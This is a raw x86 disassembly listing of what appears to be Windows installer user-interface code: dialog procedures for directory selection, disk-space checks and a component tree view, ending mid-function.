  404129:	56                   	push   %esi
  40412a:	ff 75 08             	push   0x8(%ebp)
  40412d:	ff 35 68 32 47 00    	push   0x473268
  404133:	e8 56 17 00 00       	call   0x40588e
  404138:	5f                   	pop    %edi
  404139:	5e                   	pop    %esi
  40413a:	5b                   	pop    %ebx
  40413b:	c9                   	leave
  40413c:	c2 08 00             	ret    $0x8
  40413f:	8b 15 cc b2 47 00    	mov    0x47b2cc,%edx
  404145:	8b 0d c8 b2 47 00    	mov    0x47b2c8,%ecx
  40414b:	33 c0                	xor    %eax,%eax
  40414d:	85 d2                	test   %edx,%edx
  40414f:	74 1a                	je     0x40416b
  404151:	56                   	push   %esi
  404152:	4a                   	dec    %edx
  404153:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404157:	74 07                	je     0x404160
  404159:	8b 74 24 08          	mov    0x8(%esp),%esi
  40415d:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404160:	81 c1 20 40 00 00    	add    $0x4020,%ecx
  404166:	85 d2                	test   %edx,%edx
  404168:	75 e8                	jne    0x404152
  40416a:	5e                   	pop    %esi
  40416b:	c2 04 00             	ret    $0x4
  40416e:	55                   	push   %ebp
  40416f:	8b ec                	mov    %esp,%ebp
  404171:	83 ec 48             	sub    $0x48,%esp
  404174:	a1 c8 fd 45 00       	mov    0x45fdc8,%eax
  404179:	53                   	push   %ebx
  40417a:	56                   	push   %esi
  40417b:	8b 70 3c             	mov    0x3c(%eax),%esi
  40417e:	69 f6 08 40 00 00    	imul   $0x4008,%esi,%esi
  404184:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404187:	8b 40 38             	mov    0x38(%eax),%eax
  40418a:	81 c6 00 c0 47 00    	add    $0x47c000,%esi
  404190:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404197:	57                   	push   %edi
  404198:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40419b:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  4041a0:	75 0d                	jne    0x4041af
  4041a2:	56                   	push   %esi
  4041a3:	53                   	push   %ebx
  4041a4:	e8 eb 16 00 00       	call   0x405894
  4041a9:	56                   	push   %esi
  4041aa:	e8 9b 1a 00 00       	call   0x405c4a
  4041af:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4041b6:	75 72                	jne    0x40422a
  4041b8:	8b 7d 08             	mov    0x8(%ebp),%edi
  4041bb:	53                   	push   %ebx
  4041bc:	57                   	push   %edi
  4041bd:	ff 15 60 82 40 00    	call   *0x408260
  4041c3:	56                   	push   %esi
  4041c4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4041c7:	e8 69 17 00 00       	call   0x405935
  4041cc:	85 c0                	test   %eax,%eax
  4041ce:	74 10                	je     0x4041e0
  4041d0:	56                   	push   %esi
  4041d1:	e8 94 17 00 00       	call   0x40596a
  4041d6:	85 c0                	test   %eax,%eax
  4041d8:	75 06                	jne    0x4041e0
  4041da:	56                   	push   %esi
  4041db:	e8 69 1f 00 00       	call   0x406149
  4041e0:	56                   	push   %esi
  4041e1:	ff 75 f8             	push   -0x8(%ebp)
  4041e4:	89 3d 68 32 47 00    	mov    %edi,0x473268
  4041ea:	ff 15 28 82 40 00    	call   *0x408228
  4041f0:	8b 45 14             	mov    0x14(%ebp),%eax
  4041f3:	ff 70 34             	push   0x34(%eax)
  4041f6:	6a 01                	push   $0x1
  4041f8:	57                   	push   %edi
  4041f9:	e8 2c f8 ff ff       	call   0x403a2a
  4041fe:	8b 45 14             	mov    0x14(%ebp),%eax
  404201:	ff 70 30             	push   0x30(%eax)
  404204:	6a 14                	push   $0x14
  404206:	57                   	push   %edi
  404207:	e8 1e f8 ff ff       	call   0x403a2a
  40420c:	ff 75 f8             	push   -0x8(%ebp)
  40420f:	e8 6f f8 ff ff       	call   0x403a83
  404214:	6a 07                	push   $0x7
  404216:	e8 07 1b 00 00       	call   0x405d22
  40421b:	85 c0                	test   %eax,%eax
  40421d:	0f 84 7a 02 00 00    	je     0x40449d
  404223:	6a 01                	push   $0x1
  404225:	ff 75 f8             	push   -0x8(%ebp)
  404228:	ff d0                	call   *%eax
  40422a:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404231:	0f 85 d2 00 00 00    	jne    0x404309
  404237:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  40423b:	3b c3                	cmp    %ebx,%eax
  40423d:	75 1b                	jne    0x40425a
  40423f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404242:	c1 e9 10             	shr    $0x10,%ecx
  404245:	ba 00 03 00 00       	mov    $0x300,%edx
  40424a:	66 3b ca             	cmp    %dx,%cx
  40424d:	0f 85 4a 02 00 00    	jne    0x40449d
  404253:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40425a:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  40425f:	0f 85 a4 00 00 00    	jne    0x404309
  404265:	6a 07                	push   $0x7
  404267:	59                   	pop    %ecx
  404268:	ff 75 fc             	push   -0x4(%ebp)
  40426b:	33 c0                	xor    %eax,%eax
  40426d:	8d 7d bc             	lea    -0x44(%ebp),%edi
  404270:	f3 ab                	rep stos %eax,%es:(%edi)
  404272:	8b 45 08             	mov    0x8(%ebp),%eax
  404275:	bf a8 fd 44 00       	mov    $0x44fda8,%edi
  40427a:	68 70 fd 43 00       	push   $0x43fd70
  40427f:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404282:	89 7d c0             	mov    %edi,-0x40(%ebp)
  404285:	c7 45 cc 2e 3c 40 00 	movl   $0x403c2e,-0x34(%ebp)
  40428c:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40428f:	e8 99 1f 00 00       	call   0x40622d
  404294:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404297:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40429a:	50                   	push   %eax
  40429b:	c7 45 c8 41 00 00 00 	movl   $0x41,-0x38(%ebp)
  4042a2:	ff 15 78 81 40 00    	call   *0x408178
  4042a8:	85 c0                	test   %eax,%eax
  4042aa:	74 56                	je     0x404302
  4042ac:	50                   	push   %eax
  4042ad:	ff 15 ac 82 40 00    	call   *0x4082ac
  4042b3:	56                   	push   %esi
  4042b4:	e8 90 1e 00 00       	call   0x406149
  4042b9:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  4042be:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  4042c4:	85 c0                	test   %eax,%eax
  4042c6:	74 28                	je     0x4042f0
  4042c8:	81 fe a8 00 4d 00    	cmp    $0x4d00a8,%esi
  4042ce:	75 20                	jne    0x4042f0
  4042d0:	50                   	push   %eax
  4042d1:	6a 00                	push   $0x0
  4042d3:	e8 55 1f 00 00       	call   0x40622d
  4042d8:	57                   	push   %edi
  4042d9:	bf 20 b2 46 00       	mov    $0x46b220,%edi
  4042de:	57                   	push   %edi
  4042df:	ff 15 14 81 40 00    	call   *0x408114
  4042e5:	85 c0                	test   %eax,%eax
  4042e7:	74 07                	je     0x4042f0
  4042e9:	57                   	push   %edi
  4042ea:	56                   	push   %esi
  4042eb:	e8 47 19 00 00       	call   0x405c37
  4042f0:	ff 05 6c fd 43 00    	incl   0x43fd6c
  4042f6:	56                   	push   %esi
  4042f7:	53                   	push   %ebx
  4042f8:	ff 75 08             	push   0x8(%ebp)
  4042fb:	e8 8e 15 00 00       	call   0x40588e
  404300:	eb 07                	jmp    0x404309
  404302:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404309:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404310:	74 0d                	je     0x40431f
  404312:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404319:	0f 85 7e 01 00 00    	jne    0x40449d
  40431f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404323:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404327:	56                   	push   %esi
  404328:	53                   	push   %ebx
  404329:	e8 66 15 00 00       	call   0x405894
  40432e:	56                   	push   %esi
  40432f:	e8 71 1e 00 00       	call   0x4061a5
  404334:	85 c0                	test   %eax,%eax
  404336:	75 07                	jne    0x40433f
  404338:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40433f:	56                   	push   %esi
  404340:	bf 90 3d 44 00       	mov    $0x443d90,%edi
  404345:	57                   	push   %edi
  404346:	e8 d0 18 00 00       	call   0x405c1b
  40434b:	33 db                	xor    %ebx,%ebx
  40434d:	53                   	push   %ebx
  40434e:	e8 cf 19 00 00       	call   0x405d22
  404353:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404356:	3b c3                	cmp    %ebx,%eax
  404358:	74 3c                	je     0x404396
  40435a:	33 c0                	xor    %eax,%eax
  40435c:	3b c7                	cmp    %edi,%eax
  40435e:	74 34                	je     0x404394
  404360:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404363:	50                   	push   %eax
  404364:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404367:	50                   	push   %eax
  404368:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40436b:	50                   	push   %eax
  40436c:	57                   	push   %edi
  40436d:	ff 55 f4             	call   *-0xc(%ebp)
  404370:	85 c0                	test   %eax,%eax
  404372:	75 75                	jne    0x4043e9
  404374:	85 db                	test   %ebx,%ebx
  404376:	74 03                	je     0x40437b
  404378:	66 89 03             	mov    %ax,(%ebx)
  40437b:	57                   	push   %edi
  40437c:	e8 f7 1d 00 00       	call   0x406178
  404381:	8b d8                	mov    %eax,%ebx
  404383:	33 c0                	xor    %eax,%eax
  404385:	66 89 03             	mov    %ax,(%ebx)
  404388:	4b                   	dec    %ebx
  404389:	4b                   	dec    %ebx
  40438a:	6a 5c                	push   $0x5c
  40438c:	58                   	pop    %eax
  40438d:	66 89 03             	mov    %ax,(%ebx)
  404390:	3b df                	cmp    %edi,%ebx
  404392:	75 cc                	jne    0x404360
  404394:	33 db                	xor    %ebx,%ebx
  404396:	56                   	push   %esi
  404397:	57                   	push   %edi
  404398:	e8 7e 18 00 00       	call   0x405c1b
  40439d:	57                   	push   %edi
  40439e:	e8 c7 15 00 00       	call   0x40596a
  4043a3:	3b c3                	cmp    %ebx,%eax
  4043a5:	74 05                	je     0x4043ac
  4043a7:	33 c9                	xor    %ecx,%ecx
  4043a9:	66 89 08             	mov    %cx,(%eax)
  4043ac:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4043af:	50                   	push   %eax
  4043b0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4043b3:	50                   	push   %eax
  4043b4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4043b7:	50                   	push   %eax
  4043b8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4043bb:	50                   	push   %eax
  4043bc:	57                   	push   %edi
  4043bd:	ff 15 c8 80 40 00    	call   *0x4080c8
  4043c3:	85 c0                	test   %eax,%eax
  4043c5:	74 3a                	je     0x404401
  4043c7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4043ca:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  4043ce:	be 00 04 00 00       	mov    $0x400,%esi
  4043d3:	56                   	push   %esi
  4043d4:	ff 75 f4             	push   -0xc(%ebp)
  4043d7:	50                   	push   %eax
  4043d8:	ff 15 48 81 40 00    	call   *0x408148
  4043de:	8b f8                	mov    %eax,%edi
  4043e0:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4043e7:	eb 20                	jmp    0x404409
  4043e9:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4043ec:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4043ef:	0f ac c7 0a          	shrd   $0xa,%eax,%edi
  4043f3:	c1 e8 0a             	shr    $0xa,%eax
  4043f6:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4043fd:	33 db                	xor    %ebx,%ebx
  4043ff:	eb 03                	jmp    0x404404
  404401:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404404:	be 00 04 00 00       	mov    $0x400,%esi
  404409:	6a 05                	push   $0x5
  40440b:	e8 2f fd ff ff       	call   0x40413f
  404410:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  404413:	74 0b                	je     0x404420
  404415:	3b f8                	cmp    %eax,%edi
  404417:	73 07                	jae    0x404420
  404419:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404420:	8b 0d 88 32 47 00    	mov    0x473288,%ecx
  404426:	39 59 10             	cmp    %ebx,0x10(%ecx)
  404429:	74 2b                	je     0x404456
  40442b:	6a fb                	push   $0xfffffffb
  40442d:	68 ff 03 00 00       	push   $0x3ff
  404432:	e8 3f fc ff ff       	call   0x404076
  404437:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40443a:	74 0c                	je     0x404448
  40443c:	6a fc                	push   $0xfffffffc
  40443e:	56                   	push   %esi
  40443f:	8b c7                	mov    %edi,%eax
  404441:	e8 30 fc ff ff       	call   0x404076
  404446:	eb 0e                	jmp    0x404456
  404448:	68 1c 86 40 00       	push   $0x40861c
  40444d:	56                   	push   %esi
  40444e:	ff 75 08             	push   0x8(%ebp)
  404451:	e8 38 14 00 00       	call   0x40588e
  404456:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404459:	a3 84 b3 47 00       	mov    %eax,0x47b384
  40445e:	3b c3                	cmp    %ebx,%eax
  404460:	75 0a                	jne    0x40446c
  404462:	6a 07                	push   $0x7
  404464:	e8 b4 cf ff ff       	call   0x40141d
  404469:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40446c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40446f:	85 70 14             	test   %esi,0x14(%eax)
  404472:	74 03                	je     0x404477
  404474:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  404477:	33 c0                	xor    %eax,%eax
  404479:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  40447c:	0f 94 c0             	sete   %al
  40447f:	50                   	push   %eax
  404480:	e8 eb f5 ff ff       	call   0x403a70
  404485:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  404488:	75 0d                	jne    0x404497
  40448a:	39 1d 6c fd 43 00    	cmp    %ebx,0x43fd6c
  404490:	75 05                	jne    0x404497
  404492:	e8 b5 f5 ff ff       	call   0x403a4c
  404497:	89 1d 6c fd 43 00    	mov    %ebx,0x43fd6c
  40449d:	ff 75 14             	push   0x14(%ebp)
  4044a0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4044a3:	ff 75 10             	push   0x10(%ebp)
  4044a6:	e8 0a f6 ff ff       	call   0x403ab5
  4044ab:	5f                   	pop    %edi
  4044ac:	5e                   	pop    %esi
  4044ad:	5b                   	pop    %ebx
  4044ae:	c9                   	leave
  4044af:	c2 10 00             	ret    $0x10
  4044b2:	55                   	push   %ebp
  4044b3:	8b ec                	mov    %esp,%ebp
  4044b5:	83 ec 38             	sub    $0x38,%esp
  4044b8:	56                   	push   %esi
  4044b9:	8b 35 78 82 40 00    	mov    0x408278,%esi
  4044bf:	57                   	push   %edi
  4044c0:	8b 7d 08             	mov    0x8(%ebp),%edi
  4044c3:	6a 00                	push   $0x0
  4044c5:	6a 09                	push   $0x9
  4044c7:	68 0a 11 00 00       	push   $0x110a
  4044cc:	57                   	push   %edi
  4044cd:	ff d6                	call   *%esi
  4044cf:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4044d3:	74 3a                	je     0x40450f
  4044d5:	ff 15 98 81 40 00    	call   *0x408198
  4044db:	0f bf c8             	movswl %ax,%ecx
  4044de:	c1 e8 10             	shr    $0x10,%eax
  4044e1:	98                   	cwtl
  4044e2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4044e5:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4044e8:	50                   	push   %eax
  4044e9:	57                   	push   %edi
  4044ea:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4044ed:	ff 15 94 81 40 00    	call   *0x408194
  4044f3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4044f6:	50                   	push   %eax
  4044f7:	6a 00                	push   $0x0
  4044f9:	68 11 11 00 00       	push   $0x1111
  4044fe:	57                   	push   %edi
  4044ff:	ff d6                	call   *%esi
  404501:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404505:	75 05                	jne    0x40450c
  404507:	83 c8 ff             	or     $0xffffffff,%eax
  40450a:	eb 1e                	jmp    0x40452a
  40450c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40450f:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404512:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404515:	50                   	push   %eax
  404516:	6a 00                	push   $0x0
  404518:	68 3e 11 00 00       	push   $0x113e
  40451d:	57                   	push   %edi
  40451e:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404525:	ff d6                	call   *%esi
  404527:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40452a:	5f                   	pop    %edi
  40452b:	5e                   	pop    %esi
  40452c:	c9                   	leave
  40452d:	c2 08 00             	ret    $0x8
  404530:	55                   	push   %ebp
  404531:	8b ec                	mov    %esp,%ebp
  404533:	81 7d 0c 02 01 00 00 	cmpl   $0x102,0xc(%ebp)
  40453a:	53                   	push   %ebx
  40453b:	56                   	push   %esi
  40453c:	75 17                	jne    0x404555
  40453e:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  404542:	75 7d                	jne    0x4045c1
  404544:	68 13 04 00 00       	push   $0x413
  404549:	e8 4c f5 ff ff       	call   0x403a9a
  40454e:	33 c0                	xor    %eax,%eax
  404550:	e9 85 00 00 00       	jmp    0x4045da
  404555:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  40455c:	be 19 04 00 00       	mov    $0x419,%esi
  404561:	75 1e                	jne    0x404581
  404563:	ff 75 08             	push   0x8(%ebp)
  404566:	ff 15 a0 81 40 00    	call   *0x4081a0
  40456c:	85 c0                	test   %eax,%eax
  40456e:	74 51                	je     0x4045c1
  404570:	6a 01                	push   $0x1
  404572:	ff 75 08             	push   0x8(%ebp)
  404575:	e8 38 ff ff ff       	call   0x4044b2
  40457a:	8b d8                	mov    %eax,%ebx
  40457c:	89 75 0c             	mov    %esi,0xc(%ebp)
  40457f:	eb 03                	jmp    0x404584
  404581:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404584:	39 75 0c             	cmp    %esi,0xc(%ebp)
  404587:	75 3b                	jne    0x4045c4
  404589:	39 1d d8 fd 45 00    	cmp    %ebx,0x45fdd8
  40458f:	74 33                	je     0x4045c4
  404591:	57                   	push   %edi
  404592:	be 00 c0 47 00       	mov    $0x47c000,%esi
  404597:	56                   	push   %esi
  404598:	bf a8 fd 44 00       	mov    $0x44fda8,%edi
  40459d:	57                   	push   %edi
  40459e:	89 1d d8 fd 45 00    	mov    %ebx,0x45fdd8
  4045a4:	e8 72 16 00 00       	call   0x405c1b
  4045a9:	53                   	push   %ebx
  4045aa:	56                   	push   %esi
  4045ab:	e8 b2 15 00 00       	call   0x405b62
  4045b0:	6a 06                	push   $0x6
  4045b2:	e8 66 ce ff ff       	call   0x40141d
  4045b7:	57                   	push   %edi
  4045b8:	56                   	push   %esi
  4045b9:	e8 5d 16 00 00       	call   0x405c1b
  4045be:	5f                   	pop    %edi
  4045bf:	eb 03                	jmp    0x4045c4
  4045c1:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4045c4:	53                   	push   %ebx
  4045c5:	ff 75 10             	push   0x10(%ebp)
  4045c8:	ff 75 0c             	push   0xc(%ebp)
  4045cb:	ff 75 08             	push   0x8(%ebp)
  4045ce:	ff 35 68 fd 43 00    	push   0x43fd68
  4045d4:	ff 15 9c 81 40 00    	call   *0x40819c
  4045da:	5e                   	pop    %esi
  4045db:	5b                   	pop    %ebx
  4045dc:	5d                   	pop    %ebp
  4045dd:	c2 10 00             	ret    $0x10
  4045e0:	55                   	push   %ebp
  4045e1:	8b ec                	mov    %esp,%ebp
  4045e3:	83 ec 54             	sub    $0x54,%esp
  4045e6:	53                   	push   %ebx
  4045e7:	56                   	push   %esi
  4045e8:	8b 35 60 82 40 00    	mov    0x408260,%esi
  4045ee:	57                   	push   %edi
  4045ef:	68 f9 03 00 00       	push   $0x3f9
  4045f4:	ff 75 08             	push   0x8(%ebp)
  4045f7:	ff d6                	call   *%esi
  4045f9:	68 08 04 00 00       	push   $0x408
  4045fe:	ff 75 08             	push   0x8(%ebp)
  404601:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404604:	ff d6                	call   *%esi
  404606:	8b 35 78 82 40 00    	mov    0x408278,%esi
  40460c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40460f:	a1 c8 b2 47 00       	mov    0x47b2c8,%eax
  404614:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404617:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  40461c:	05 94 00 00 00       	add    $0x94,%eax
  404621:	33 db                	xor    %ebx,%ebx
  404623:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40462a:	6a 10                	push   $0x10
  40462c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40462f:	5f                   	pop    %edi
  404630:	0f 85 1a 02 00 00    	jne    0x404850
  404636:	8b 45 08             	mov    0x8(%ebp),%eax
  404639:	a3 10 b3 47 00       	mov    %eax,0x47b310
  40463e:	a1 cc b2 47 00       	mov    0x47b2cc,%eax
  404643:	c1 e0 02             	shl    $0x2,%eax
  404646:	50                   	push   %eax
  404647:	6a 40                	push   $0x40
  404649:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  40464c:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%ebp)
  404653:	ff 15 20 81 40 00    	call   *0x408120
  404659:	6a 6e                	push   $0x6e
  40465b:	ff 35 b8 b2 47 00    	push   0x47b2b8
  404661:	a3 84 3d 44 00       	mov    %eax,0x443d84
  404666:	ff 15 a4 81 40 00    	call   *0x4081a4
  40466c:	83 0d d8 fd 45 00 ff 	orl    $0xffffffff,0x45fdd8
  404673:	68 30 45 40 00       	push   $0x404530
  404678:	6a fc                	push   $0xfffffffc
  40467a:	ff 75 fc             	push   -0x4(%ebp)
  40467d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404680:	ff 15 64 82 40 00    	call   *0x408264
  404686:	53                   	push   %ebx
  404687:	6a 06                	push   $0x6
  404689:	6a 21                	push   $0x21
  40468b:	57                   	push   %edi
  40468c:	57                   	push   %edi
  40468d:	a3 68 fd 43 00       	mov    %eax,0x43fd68
  404692:	ff 15 34 80 40 00    	call   *0x408034
  404698:	68 ff 00 ff 00       	push   $0xff00ff
  40469d:	ff 75 f0             	push   -0x10(%ebp)
  4046a0:	a3 80 3d 44 00       	mov    %eax,0x443d80
  4046a5:	50                   	push   %eax
  4046a6:	ff 15 28 80 40 00    	call   *0x408028
  4046ac:	ff 35 80 3d 44 00    	push   0x443d80
  4046b2:	6a 02                	push   $0x2
  4046b4:	68 09 11 00 00       	push   $0x1109
  4046b9:	ff 75 fc             	push   -0x4(%ebp)
  4046bc:	ff d6                	call   *%esi
  4046be:	53                   	push   %ebx
  4046bf:	53                   	push   %ebx
  4046c0:	68 1c 11 00 00       	push   $0x111c
  4046c5:	ff 75 fc             	push   -0x4(%ebp)
  4046c8:	ff d6                	call   *%esi
  4046ca:	3b c7                	cmp    %edi,%eax
  4046cc:	7d 0c                	jge    0x4046da
  4046ce:	53                   	push   %ebx
  4046cf:	57                   	push   %edi
  4046d0:	68 1b 11 00 00       	push   $0x111b
  4046d5:	ff 75 fc             	push   -0x4(%ebp)
  4046d8:	ff d6                	call   *%esi
  4046da:	ff 75 f0             	push   -0x10(%ebp)
  4046dd:	ff 15 44 80 40 00    	call   *0x408044
  4046e3:	33 ff                	xor    %edi,%edi
  4046e5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4046e8:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  4046eb:	3b c3                	cmp    %ebx,%eax
  4046ed:	74 27                	je     0x404716
  4046ef:	83 ff 20             	cmp    $0x20,%edi
  4046f2:	74 03                	je     0x4046f7
  4046f4:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4046f7:	50                   	push   %eax
  4046f8:	53                   	push   %ebx
  4046f9:	e8 2f 1b 00 00       	call   0x40622d
  4046fe:	50                   	push   %eax
  4046ff:	53                   	push   %ebx
  404700:	68 43 01 00 00       	push   $0x143
  404705:	ff 75 f8             	push   -0x8(%ebp)
  404708:	ff d6                	call   *%esi
  40470a:	57                   	push   %edi
  40470b:	50                   	push   %eax
  40470c:	68 51 01 00 00       	push   $0x151
  404711:	ff 75 f8             	push   -0x8(%ebp)
  404714:	ff d6                	call   *%esi
  404716:	47                   	inc    %edi
  404717:	83 ff 21             	cmp    $0x21,%edi
  40471a:	7c c9                	jl     0x4046e5
  40471c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40471f:	8b 7d 14             	mov    0x14(%ebp),%edi
  404722:	ff 74 87 30          	push   0x30(%edi,%eax,4)
  404726:	6a 15                	push   $0x15
  404728:	ff 75 08             	push   0x8(%ebp)
  40472b:	e8 fa f2 ff ff       	call   0x403a2a
  404730:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404733:	ff 74 87 34          	push   0x34(%edi,%eax,4)
  404737:	6a 16                	push   $0x16
  404739:	ff 75 08             	push   0x8(%ebp)
  40473c:	e8 e9 f2 ff ff       	call   0x403a2a
  404741:	33 ff                	xor    %edi,%edi
  404743:	39 1d cc b2 47 00    	cmp    %ebx,0x47b2cc
  404749:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40474c:	0f 8e bc 00 00 00    	jle    0x40480e
  404752:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404755:	83 c0 08             	add    $0x8,%eax
  404758:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40475b:	bb 32 11 00 00       	mov    $0x1132,%ebx
  404760:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404763:	8d 42 10             	lea    0x10(%edx),%eax
  404766:	66 83 38 00          	cmpw   $0x0,(%eax)
  40476a:	0f 84 84 00 00 00    	je     0x4047f4
  404770:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404773:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404776:	8b 02                	mov    (%edx),%eax
  404778:	6a 20                	push   $0x20
  40477a:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  40477d:	59                   	pop    %ecx
  40477e:	8b d0                	mov    %eax,%edx
  404780:	23 d1                	and    %ecx,%edx
  404782:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  404789:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  404790:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  404793:	89 7d d8             	mov    %edi,-0x28(%ebp)
  404796:	89 55 bc             	mov    %edx,-0x44(%ebp)
  404799:	a8 02                	test   $0x2,%al
  40479b:	74 26                	je     0x4047c3
  40479d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4047a0:	50                   	push   %eax
  4047a1:	6a 00                	push   $0x0
  4047a3:	53                   	push   %ebx
  4047a4:	ff 75 fc             	push   -0x4(%ebp)
  4047a7:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  4047ae:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4047b5:	ff d6                	call   *%esi
  4047b7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4047ba:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4047c1:	eb 28                	jmp    0x4047eb
  4047c3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4047c6:	f6 00 04             	testb  $0x4,(%eax)
  4047c9:	74 14                	je     0x4047df
  4047cb:	ff 75 f4             	push   -0xc(%ebp)
  4047ce:	6a 03                	push   $0x3
  4047d0:	68 0a 11 00 00       	push   $0x110a
  4047d5:	ff 75 fc             	push   -0x4(%ebp)
  4047d8:	ff d6                	call   *%esi
  4047da:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4047dd:	eb 15                	jmp    0x4047f4
  4047df:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4047e2:	50                   	push   %eax
  4047e3:	6a 00                	push   $0x0
  4047e5:	53                   	push   %ebx
  4047e6:	ff 75 fc             	push   -0x4(%ebp)
  4047e9:	ff d6                	call   *%esi
  4047eb:	8b 0d 84 3d 44 00    	mov    0x443d84,%ecx
  4047f1:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  4047f4:	81 45 f0 20 40 00 00 	addl   $0x4020,-0x10(%ebp)
  4047fb:	47                   	inc    %edi
  4047fc:	3b 3d cc b2 47 00    	cmp    0x47b2cc,%edi
  404802:	0f 8c 58 ff ff ff    	jl     0x404760
  404808:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40480c:	75 1a                	jne    0x404828
  40480e:	6a f0                	push   $0xfffffff0
  404810:	ff 75 fc             	push   -0x4(%ebp)
  404813:	ff 15 48 82 40 00    	call   *0x408248
  404819:	83 e0 fb             	and    $0xfffffffb,%eax
  40481c:	50                   	push   %eax
  40481d:	6a f0                	push   $0xfffffff0
  40481f:	ff 75 fc             	push   -0x4(%ebp)
  404822:	ff 15 64 82 40 00    	call   *0x408264
  404828:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40482c:	75 18                	jne    0x404846
  40482e:	6a 05                	push   $0x5
  404830:	ff 75 f8             	push   -0x8(%ebp)
  404833:	ff 15 34 82 40 00    	call   *0x408234
